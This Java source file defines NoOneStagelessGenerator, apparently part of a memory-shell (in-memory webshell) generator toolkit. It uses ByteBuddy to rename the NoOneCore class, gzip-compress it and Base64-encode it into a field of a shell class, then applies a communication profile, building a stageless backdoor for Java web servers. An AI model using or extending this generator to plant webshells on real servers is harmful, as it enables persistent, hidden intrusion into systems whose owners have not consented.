package com.reajason.noone.core.generator.memshell;

import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.noone.core.NoOneCore;
import com.reajason.noone.core.generator.ProfileVisitorWrapper;
import com.reajason.noone.core.generator.config.NoOneConfig;
import com.reajason.noone.server.profile.Profile;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

import java.util.Base64;

import static net.bytebuddy.matcher.ElementMatchers.named;

public class NoOneStagelessGenerator extends ByteBuddyShellGenerator<NoOneConfig> {

    public NoOneStagelessGenerator(ShellConfig shellConfig, NoOneConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        DynamicType.Builder<?> builder = new ByteBuddy().redefine(shellToolConfig.getShellClass());

        try (DynamicType.Unloaded<NoOneCore> unloaded = new ByteBuddy()
                .redefine(NoOneCore.class)
                .name(shellToolConfig.getShellClassName() + "$1")
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make()) {
            String coreGzipBase64 = Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(unloaded.getBytes()));
            builder = builder.field(named("coreGzipBase64")).value(coreGzipBase64);
        }

        Profile profile = shellToolConfig.getCoreProfile();
        return ProfileVisitorWrapper.extend(builder, profile,
                shellConfig.getShellType(), shellToolConfig.getShellClassName());
    }
}
